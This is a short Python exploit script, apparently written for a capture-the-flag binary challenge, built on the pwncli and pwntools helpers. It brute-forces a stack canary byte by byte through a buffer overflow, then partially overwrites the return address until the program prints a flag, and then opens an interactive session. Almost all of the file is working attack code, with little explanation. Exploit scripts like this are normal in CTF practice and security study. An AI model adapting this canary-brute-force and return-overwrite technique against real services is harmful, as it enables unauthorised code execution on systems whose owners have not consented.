#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
#  set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def cmd(choice):
    ru(b'> ')
    sl(i2b(choice))

context(arch='amd64')

canary=[b'\x00']
for i in range(7):
    for b in range(256):
        ru(b'come')
        s(flat(b'\x00'*(0x70-8),canary,p8(b)))
        if b'terminated' not in ru(b'wel'):
            canary.append(p8(b))
            break
for a in range(2,0xf2+1,0x10):
    if b'flag' in ru(b'come'):
        break
    s(flat(b'\x00'*(0x70-8),canary,0,b'\x2e',p8(a)))

ia()
